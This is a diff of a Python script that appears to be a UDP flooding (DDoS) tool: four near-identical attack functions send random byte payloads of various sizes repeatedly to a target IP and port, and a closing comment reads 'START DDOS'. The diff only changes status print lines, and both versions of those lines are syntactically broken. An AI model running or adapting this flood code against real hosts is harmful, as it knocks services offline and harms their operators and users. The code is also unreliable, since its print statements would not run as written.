@@ -27,9 +27,9 @@ def attack():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port)-> %d %len(lsts))
+			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %d %len(lsts))
 		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port)-> %d %len(lsts))
+			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %d %len(lsts))
 
 def attack2():
 	data = random._urandom(1800)
@@ -40,9 +40,9 @@ def attack2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port)-> %d %len(lsts))
+			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %d %len(lsts))
 		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port)-> %d %len(lsts))
+			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %d %len(lsts))
 
 def attack3():
 	data = random._urandom(999)
@@ -53,9 +53,9 @@ def attack3():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port)-> %d %len(lsts))
+			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %d %len(lsts))
 		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port)-> %d %len(lsts))
+			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %d %len(lsts))
 
 def attack4():
 	data = random._urandom(818)
@@ -66,9 +66,9 @@ def attack4():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port)-> %d %len(lsts))
+			print(i +" Attack to ip > {} and port > {} ?!!".format(ip, port) %d %len(lsts))
 		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port)-> %d %len(lsts))
+			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %d %len(lsts))
 
 ###################################################################################
 # START DDOS
